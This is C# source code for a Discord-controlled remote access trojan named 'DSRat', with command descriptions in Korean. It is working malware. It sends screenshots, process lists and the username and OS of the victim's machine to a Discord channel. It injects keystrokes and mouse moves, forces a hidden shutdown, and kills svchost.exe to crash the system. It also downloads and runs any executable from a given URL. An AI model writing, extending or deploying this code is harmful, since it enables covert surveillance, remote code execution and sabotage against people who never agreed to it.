using AudioSwitcher.AudioApi.CoreAudio;
using Discord.Commands;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Forms;
using System.IO;
using Newtonsoft.Json.Linq;
using Discord;
using System.Speech.Synthesis;
using System.Collections.Generic;
using AForge.Video;
using AForge.Video.DirectShow;

namespace DSRat
{
    public class Command : ModuleBase<SocketCommandContext>
    {
        [Command("명령어")]
        public async Task help()
        {
            EmbedBuilder embed = new EmbedBuilder();

            embed.WithTitle("명령어");
            embed.AddField("!키입력 입력할키", "키를 입력해줌", false);
            embed.AddField("!컴퓨터종료", "클라이언트의 컴퓨터를 종료해줌", false);
            embed.AddField("!마우스이동 x y", "마우스를 x,y의 좌표로 이동시킴", false);
            embed.AddField("!텍스트입력 입력할텍스트", "텍스트를입력함 (띄어쓰기 금지)", false);
            embed.AddField("!화면캡처", "클라이언트의 화면을 캡처해서 보내줌", false);
            embed.AddField("!웹열기 url", "지정한 웹사이트 주소를 열어줌", false);
            embed.AddField("!프로세스킬 프로세스이름", "지정한 프로세스를 종료함", false);
            embed.AddField("!상태", "클라이언트가 켜져있는지 확인을 할 수 있는 간단한명령어", false);
            embed.AddField("!프로세스", "켜져있는 프로세스의 일부를 출력해줌", false);
            embed.AddField("!메세지박스 출력할메세지", "클라이언트의 화면에 메세지박스를 띄움", false);
            embed.AddField("!시스템정보", "클라이언트의 UserName과 OS버전을 출력함", false);
            embed.AddField("!블루스크린", "클라이언트의 컴퓨터에 블루스크린을띄움", false);
            embed.AddField("!다운로드 url", "다운로드 후, 실행합니다 (무조건 exe파일만 다운로드할것)", false);
            embed.AddField("!사운드 할말", "클라이언트의 컴퓨터에 사운드로 말을 전합니다", false);
            embed.AddField("!아이피추적 아이피", "해당아이피의 정보를 추적함", false);
            embed.AddField("!소리크기 1~100", "소리크기를 설정함", false);
            embed.AddField("!프로세스찾기 프로세스이름", "프로세스가 실행중인지 찾아줌", false);
            embed.WithColor(Discord.Color.Magenta);

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }
        [Command("키입력")]
        public async Task KeySendCommand(string key)
        {
            SendKeys.SendWait(key);

            EmbedBuilder embed = new EmbedBuilder();

            embed.WithTitle("키입력");
            embed.AddField("키입력 성공!", $"입력된 키 : {key}", false);
            embed.WithColor(Discord.Color.Magenta);

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }
        [Command("컴퓨터종료")]
        public async Task ShutdownCommand()
        {
            Process logoff = new Process();
            logoff.StartInfo.FileName = "cmd.exe";
            logoff.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            logoff.StartInfo.Arguments = "/C shutdown -s -f -t -0";
            logoff.Start();
            EmbedBuilder embed = new EmbedBuilder();

            embed.WithTitle("컴퓨터종료");
            embed.AddField("컴퓨터종료 성공!", $"성공", false);
            embed.WithColor(Discord.Color.Magenta);

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }
        [Command("마우스이동")]
        public async Task MouseCommand(int x, int y)
        {

            Cursor.Position = new System.Drawing.Point(x, y);

            EmbedBuilder embed = new EmbedBuilder();
            embed.WithTitle("마우스이동");
            embed.AddField("마우스이동 성공!", $"{x}, {y}위치로 이동 ", false);
            embed.WithColor(Discord.Color.Magenta);

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }
        [Command("텍스트입력")]
        public async Task TextSendCommand([Remainder] string text)
        {
            SendKeys.SendWait("{ENTER}");
            SendKeys.SendWait(text);
            SendKeys.SendWait("{ENTER}");

            EmbedBuilder embed = new EmbedBuilder();

            embed.WithTitle("텍스트입력");
            embed.AddField("텍스트입력 성공!", $"내용 : {text}", false);
            embed.WithColor(Discord.Color.Magenta);

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }
        [Command("화면캡처")]
        public async Task ScreenShotCommand()
        {
            int width = (int)SystemParameters.PrimaryScreenWidth;
            int height = (int)SystemParameters.PrimaryScreenHeight;

            using (Bitmap bmp = new Bitmap(width, height, PixelFormat.Format32bppArgb))
            {
                using (Graphics gr = Graphics.FromImage(bmp))
                {
                    gr.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                }
                string path = Environment.GetFolderPath(System.Environment.SpecialFolder.MyPictures);
                path += "\\" + DateTime.Now.ToString("yyMMdd_HHmmss") + ".png";

                bmp.Save(path);
                
                await Context.Channel.SendFileAsync(path);
                File.Delete(path);
            }
        }
        [Command("웹열기")]
        public async Task WebStartCommand(string weburl)
        {
            System.Diagnostics.Process.Start(weburl);
            EmbedBuilder embed = new EmbedBuilder();

            embed.WithTitle("웹열기");
            embed.AddField("웹사이트 열기 성공!", $"{weburl}", false);
            embed.WithColor(Discord.Color.Magenta);

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }
        [Command("프로세스킬")]

        public async Task ProcesskillCommand(string processname)
        {
            Process[] processList = Process.GetProcessesByName(processname);
            if (processList.Length > 0)
            {
                processList[0].Kill();
                EmbedBuilder embed = new EmbedBuilder();

                embed.WithTitle("프로세스킬");
                embed.AddField($"{processname}", "프로세스킬 성공!", false);
                embed.WithColor(Discord.Color.Magenta);

                await Context.Channel.SendMessageAsync("", false, embed.Build());
            }
            else
            {
                EmbedBuilder embed = new EmbedBuilder();

                embed.WithTitle("프로세스킬");
                embed.AddField("프로세스가 켜져있지 않습니다", $"{processname}", false);
                embed.WithColor(Discord.Color.Magenta);

                await Context.Channel.SendMessageAsync("", false, embed.Build());
            }
        }
        [Command("상태")]
        public async Task onoffCommand()
        {
            EmbedBuilder embed = new EmbedBuilder();

            embed.WithTitle("상태");
            embed.WithDescription("클라이언트 켜져있음!");
            embed.WithColor(Discord.Color.Magenta);
            
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }
        [Command("프로세스")]

        public async Task ProcesslistCommand()
        {
            String procs = "";

            foreach(Process proc in Process.GetProcesses())
            {
                if (proc.ProcessName == "svchost" || proc.ProcessName == "conhost" || proc.ProcessName == "RuntimeBroker")
                {
                    continue;
                }
                else
                {
                    procs += proc.ProcessName + "\n";
                }
            }
            string path = Environment.GetFolderPath(System.Environment.SpecialFolder.MyDocuments);
            path += "\\" + DateTime.Now.ToString("yyMMdd_HHmmss") + ".txt";
            File.WriteAllText(path, procs);

            await Context.Channel.SendFileAsync(path);
            File.Delete(path);
        }
        [Command("메세지박스")]
        public async Task MessageBoxCommand([Remainder] string msg)
        {
            Thread t = new Thread(() => System.Windows.Forms.MessageBox.Show(new Form() { WindowState = FormWindowState.Maximized, TopMost = true}, msg));
            t.Start();
            EmbedBuilder embed = new EmbedBuilder();

            embed.WithTitle("메세지박스");
            embed.AddField($"내용 : {msg}", "출력성공!", false);
            embed.WithColor(Discord.Color.Magenta);

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }
        [Command("시스템정보")]
        public async Task SysinfoCommand()
        {
            EmbedBuilder embed = new EmbedBuilder();

            embed.WithTitle("시스템정보");
            embed.AddField("사용자 이름", $"{Environment.UserName}", false);
            embed.AddField("OS버전", $"{Environment.OSVersion.ToString()}", false);
            embed.WithColor(Discord.Color.Magenta);

            await Context.Channel.SendMessageAsync("", false, embed.Build());

        }
        [Command("블루스크린")]
        public async Task BlueScreenCommand()
        {
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            cmd.StartInfo.Arguments = "/C taskkill /f /im svchost.exe";
            cmd.Start();

            EmbedBuilder embed = new EmbedBuilder();

            embed.WithTitle("블루스크린");
            embed.WithDescription("블루스크린 띄우기성공!");
            embed.WithColor(Discord.Color.Magenta);

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }
        [Command("아이피")]
        public async Task adressCommand()
        {
            string url = "https://api.myip.com";

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();

            Stream stream = response.GetResponseStream();
            StreamReader reader = new StreamReader(stream, Encoding.UTF8);
            string text = reader.ReadToEnd();

            JObject obj = JObject.Parse(text);

            string ip = obj["ip"].ToString();
            string country = obj["country"].ToString();


            EmbedBuilder embed = new EmbedBuilder();

            embed.WithTitle("아이피");
            embed.AddField("IP", $"{ip}",false);
            embed.AddField("Country", $"{country}", false);
            embed.WithColor(Discord.Color.Magenta);

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }
        [Command("다운로드")]
        public async Task exeDownloaderCommand(string url)
        {
            string filepath = Environment.GetFolderPath(Environment.SpecialFolder.PrinterShortcuts);
            string copypath = filepath += "\\" +  DateTime.Now.ToString("yyMMdd_HHmmss") + ".exe";

            WebClient client = new WebClient();
            client.DownloadFile(url, copypath);
            Thread.Sleep(1500);
            Process.Start(copypath);

            EmbedBuilder embed = new EmbedBuilder();

            embed.WithTitle("다운로드");
            embed.AddField("다운로드 성공!", $"{url}", false);
            embed.WithColor(Discord.Color.Magenta);

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }
        [Command("사운드")]
        public async Task speakCommand([Remainder] string text)
        {
            SpeechSynthesizer speak = new SpeechSynthesizer
            {
                Volume = 100,
            };
            Thread.Sleep(300);
            speak.SpeakAsync(text);

            EmbedBuilder embed = new EmbedBuilder();

            embed.WithTitle("사운드");
            embed.AddField("사운드 들려주기 성공!", $"{text}", false);
            embed.WithColor(Discord.Color.Magenta);

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }
        [Command("소리크기")]
        public async Task SoundsizeCommand(int size)
        {
            CoreAudioDevice defaultPlaybackDevice = new CoreAudioController().DefaultPlaybackDevice;
            Debug.WriteLine("Current Volume:" + defaultPlaybackDevice.Volume);
            defaultPlaybackDevice.Volume = size;

            EmbedBuilder embed = new EmbedBuilder();

            embed.WithTitle("소리크기");
            embed.AddField("소리크기 조절 성공!", $"소리 크기 : {size}", false);
            embed.WithColor(Discord.Color.Magenta);

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }
        [Command("아이피추적")]
        public async Task iptrackerCommand([Remainder]string ip)
        {
            string url = "http://ip-api.com/json/" + ip;


            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();

            Stream stream = response.GetResponseStream();
            StreamReader reader = new StreamReader(stream, Encoding.UTF8);
            string text = reader.ReadToEnd();

            JObject obj = JObject.Parse(text);

            string country = obj["country"].ToString();
            string city = obj["city"].ToString();
            string regionName = obj["regionName"].ToString();
            string lat = obj["lat"].ToString();
            string lon = obj["lon"].ToString();
            string timezone = obj["timezone"].ToString();

            EmbedBuilder embed = new EmbedBuilder();

            embed.WithTitle("아이피 트래킹");
            embed.AddField("아이피", $"아이피 : {ip}", false);
            embed.AddField("국가", $"{country}", false);
            embed.AddField("도시", $"{city}", false);
            embed.AddField("지역", $"{regionName}", false);
            embed.AddField("위도", $"{lat}", false);
            embed.AddField("경도", $"{lon}", false);
            embed.AddField("시간대", $"{timezone}", false);
            embed.WithColor(Discord.Color.Magenta);

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }
        [Command("프로세스찾기")]
        public async Task findprocCommand(string procname)
        {
            foreach(Process proc in Process.GetProcesses())
            {
                if(proc.ProcessName == procname)
                {
                    
                    EmbedBuilder embedd = new EmbedBuilder();

                    embedd.WithTitle("프로세스찾기");
                    embedd.WithDescription($"{procname} 켜져있음");
                    embedd.WithColor(Discord.Color.Magenta);

                    await Context.Channel.SendMessageAsync("", false, embedd.Build());
                    return;
                }
            }
            EmbedBuilder embed = new EmbedBuilder();

            embed.WithTitle("프로세스찾기");
            embed.WithDescription($"{procname} 를 찾을 수 없음");
            embed.WithColor(Discord.Color.Magenta);

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }
    }
} 